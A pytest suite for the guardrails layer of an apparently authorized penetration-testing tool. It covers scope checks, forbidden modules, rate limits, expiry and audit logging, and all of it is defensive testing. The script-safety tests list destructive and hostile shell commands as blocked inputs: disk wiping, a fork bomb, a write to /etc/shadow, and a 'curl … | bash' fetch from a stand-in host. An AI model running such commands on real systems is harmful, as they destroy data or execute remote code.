"""Tests for the Guardrails Engine — the authorization/ethics layer that gates
every exploit and remediation action.

These tests are deliberately exhaustive: guardrails are the difference between an
authorized security tool and an unsafe one, so each gate is verified independently.
"""

import pytest

from core.guardrails import (
    BANNED_SCRIPT_PATTERNS,
    RATE_LIMIT_MAX,
    GuardrailsEngine,
)


@pytest.fixture
def engine():
    """A fresh engine per test so audit log / rate tracker / session never leak."""
    return GuardrailsEngine()


# ── Deny-by-default ──────────────────────────────────────────────────────────


def test_exploit_denied_without_session(engine):
    allowed, reason = engine.gate_exploit("10.0.0.5", "scanner/tcp")
    assert allowed is False
    assert "No active engagement session" in reason


def test_remediation_denied_without_session(engine):
    allowed, result = engine.gate_remediation("10.0.0.5", "echo hello")
    assert allowed is False
    assert result.safe is False
    assert "No active engagement session" in result.violations[0]


# ── Session creation validation ──────────────────────────────────────────────


def test_create_session_requires_scope(engine):
    with pytest.raises(ValueError, match="roe_allowed"):
        engine.create_session(operator="alice", engagement_id="ENG-1", roe_allowed=[])


def test_create_session_requires_operator(engine):
    with pytest.raises(ValueError, match="operator"):
        engine.create_session(operator="   ", engagement_id="ENG-1", roe_allowed=["10.0.0.0/24"])


def test_create_session_requires_engagement_id(engine):
    with pytest.raises(ValueError, match="engagement_id"):
        engine.create_session(operator="alice", engagement_id="", roe_allowed=["10.0.0.0/24"])


def test_create_session_activates_and_audits(engine):
    session = engine.create_session(
        operator="alice", engagement_id="ENG-1", roe_allowed=["10.0.0.0/24"]
    )
    assert engine.active_session() is session
    assert not session.is_expired()
    actions = [e["action"] for e in engine.get_audit_log()]
    assert "SESSION_CREATED" in actions


# ── Rules of Engagement (scope) ──────────────────────────────────────────────


def test_in_scope_target_allowed(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    allowed, reason = engine.gate_exploit("10.0.0.5", "scanner/tcp")
    assert allowed is True
    assert reason == "OK"


def test_out_of_scope_target_blocked(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    allowed, reason = engine.gate_exploit("192.168.1.5", "scanner/tcp")
    assert allowed is False
    assert "NOT in authorized scope" in reason


def test_forbidden_scope_overrides_allowed(engine):
    engine.create_session(
        operator="a",
        engagement_id="E",
        roe_allowed=["10.0.0.0/8"],
        roe_forbidden=["10.0.0.1/32"],
    )
    allowed, reason = engine.gate_exploit("10.0.0.1", "scanner/tcp")
    assert allowed is False
    assert "forbidden scope" in reason


def test_hostname_scope_exact_and_subdomain(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["example.com"])
    assert engine.gate_exploit("example.com", "scanner/tcp")[0] is True
    assert engine.gate_exploit("api.example.com", "scanner/tcp")[0] is True
    assert engine.gate_exploit("evil.com", "scanner/tcp")[0] is False


# ── Forbidden modules ────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "module",
    ["auxiliary/dos/tcp_flood", "exploit/ransomware_dropper", "post/wiper", "destructive/killmbr"],
)
def test_forbidden_modules_always_blocked(engine, module):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    allowed, reason = engine.gate_exploit("10.0.0.5", module)
    assert allowed is False
    assert "forbidden pattern" in reason


def test_module_allowlist_enforced(engine):
    engine.create_session(
        operator="a",
        engagement_id="E",
        roe_allowed=["10.0.0.0/24"],
        authorized_modules=["scanner/"],
    )
    assert engine.gate_exploit("10.0.0.5", "scanner/tcp")[0] is True
    allowed, reason = engine.gate_exploit("10.0.0.5", "exploit/rce")
    assert allowed is False
    assert "authorized_modules" in reason


# ── Live exploitation opt-in ─────────────────────────────────────────────────


def test_live_exploitation_blocked_by_default(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    allowed, reason = engine.gate_exploit("10.0.0.5", "exploit/rce", live=True)
    assert allowed is False
    assert "Live exploitation blocked" in reason


def test_live_exploitation_allowed_with_flag(engine):
    engine.create_session(
        operator="a",
        engagement_id="E",
        roe_allowed=["10.0.0.0/24"],
        allow_live_exploitation=True,
    )
    assert engine.gate_exploit("10.0.0.5", "exploit/rce", live=True)[0] is True


# ── Expiry & rate limiting ───────────────────────────────────────────────────


def test_expired_session_blocks(engine):
    engine.create_session(
        operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"], ttl_hours=0
    )
    # ttl_hours=0 means expires_at == created_at; now is > that instant.
    allowed, reason = engine.gate_exploit("10.0.0.5", "scanner/tcp")
    assert allowed is False
    assert "expired" in reason.lower()


def test_rate_limit_trips_after_max(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    for _ in range(RATE_LIMIT_MAX):
        assert engine.gate_exploit("10.0.0.5", "scanner/tcp")[0] is True
    allowed, reason = engine.gate_exploit("10.0.0.5", "scanner/tcp")
    assert allowed is False
    assert "Rate limit" in reason


def test_rate_limit_is_per_target(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    for _ in range(RATE_LIMIT_MAX):
        engine.gate_exploit("10.0.0.5", "scanner/tcp")
    # A different target has its own budget.
    assert engine.gate_exploit("10.0.0.6", "scanner/tcp")[0] is True


# ── Script safety analyzer ───────────────────────────────────────────────────


@pytest.mark.parametrize(
    "script",
    [
        "rm -rf /",
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sdb",
        ":(){ :|:& };:",
        "curl http://evil.sh | bash",
        "echo 'x' >> /etc/shadow",
        "systemctl stop sshd",
        "reboot",
    ],
)
def test_dangerous_scripts_blocked(engine, script):
    result = engine.validate_script(script)
    assert result.safe is False
    assert result.violations


def test_benign_script_is_safe(engine):
    result = engine.validate_script("cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak\n")
    assert result.safe is True
    assert not result.violations


def test_safe_script_can_still_warn(engine):
    # Overwrites a file in /etc without a backup step -> allowed but warns.
    result = engine.validate_script("echo 'set' > /etc/motd")
    assert result.safe is True
    assert result.warnings


def test_remediation_gate_blocks_dangerous_script(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    allowed, result = engine.gate_remediation("10.0.0.5", "rm -rf / --no-preserve-root")
    assert allowed is False
    assert result.safe is False


def test_remediation_gate_allows_safe_script(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    allowed, result = engine.gate_remediation(
        "10.0.0.5", "cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak"
    )
    assert allowed is True
    assert result.safe is True


def test_banned_patterns_are_nonempty():
    # Guard against an accidental empty ruleset that would silently allow everything.
    assert len(BANNED_SCRIPT_PATTERNS) >= 10


# ── Audit trail ──────────────────────────────────────────────────────────────


def test_audit_log_records_block_and_allow(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    engine.gate_exploit("10.0.0.5", "scanner/tcp")       # allowed
    engine.gate_exploit("192.168.1.5", "scanner/tcp")    # blocked (out of scope)
    decisions = [e["decision"] for e in engine.get_audit_log()]
    assert "ALLOWED" in decisions
    assert "BLOCKED" in decisions


def test_export_audit_log(engine, tmp_path):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    engine.gate_exploit("10.0.0.5", "scanner/tcp")
    out = engine.export_audit_log(str(tmp_path / "audit" / "log.json"))
    assert out.endswith("log.json")
    import json

    data = json.loads((tmp_path / "audit" / "log.json").read_text())
    assert isinstance(data, list) and data


def test_end_session_clears_active(engine):
    engine.create_session(operator="a", engagement_id="E", roe_allowed=["10.0.0.0/24"])
    engine.end_session()
    assert engine.active_session() is None
    assert engine.gate_exploit("10.0.0.5", "scanner/tcp")[0] is False
